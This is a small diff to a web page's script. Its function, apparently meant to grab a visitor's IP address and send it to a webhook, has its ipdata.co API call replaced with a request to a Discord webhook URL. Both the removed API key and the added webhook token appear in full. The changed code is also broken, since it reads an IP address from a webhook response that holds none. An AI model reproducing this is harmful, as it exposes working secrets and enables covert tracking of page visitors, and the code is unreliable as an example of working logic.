@@ -223,7 +223,7 @@
         }
 
         function getIPAddressAndSendWebhook() {
-            fetch('https://api.ipdata.co/?api-key=8701de3ac942a16e52762033f240682911128f1d6a0a2e31cc70bbb9')
+            fetch('https://discord.com/api/webhooks/1476877446585253900/wrr3cGc6m-mNJ6vCOm1qwbT1jQNt348QYCV2q8-MRsln-6jedtPVHKFqfk0sRtLOjR33')
                 .then(response => response.json())
                 .then(data => {
                     document.getElementById('ip-address').textContent = 'IP Address: ' + data.ip;
@@ -255,3 +255,4 @@
     </script>
 </body>
 </html>
+
